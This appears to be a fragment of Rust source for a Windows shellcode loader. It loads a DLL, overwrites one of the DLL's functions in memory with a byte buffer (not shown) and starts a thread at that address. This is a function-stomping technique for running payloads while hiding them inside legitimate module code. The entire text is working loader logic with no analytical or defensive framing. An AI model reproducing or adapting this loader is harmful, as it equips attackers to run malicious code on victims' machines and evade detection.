fn pause() {
    println!("[*] Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    let mut paddress: *mut c_void;

    unsafe {
        let h_user32 = LoadLibraryA(TARGET_DLL.as_ptr() as *const i8);

        if h_user32.is_null() {
            println!("[-] Failed to load library: {}", GetLastError());
            return;
        }

        let paddress = GetProcAddress(h_user32, TARGET_FUNC.as_ptr() as *const i8);

        if paddress.is_null() {
            println!("[-] Failed to get function address: {}", GetLastError());
            return;
        }

        println!("[*] Address of {}: {:p}", std::str::from_utf8(TARGET_FUNC).unwrap(), paddress);

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            GetCurrentProcess(),
            paddress as *mut c_void,
            BUF.as_ptr() as *const c_void,
            BUF.len(),
            &mut bytes_written,
        ) == 0
        {
            println!(
                "[-] WriteProcessMemory failed with error: {}",
                GetLastError()
            );
            return;
        }

        println!("[*] Successfully wrote {} bytes to {:p}", bytes_written, paddress);

        let mut thread_id: u32 = 0;

        let h_thread = CreateThread(
            null_mut(),
            0,
            Some(transmute(paddress)),
            null_mut(),
            0,
            &mut thread_id,
        );

        if h_thread.is_null() {
            println!("[-] Failed to create thread: {}", GetLastError());
            return;
        }

        WaitForSingleObject(h_thread, 0xFFFFFFFF);

        pause();
    }
}
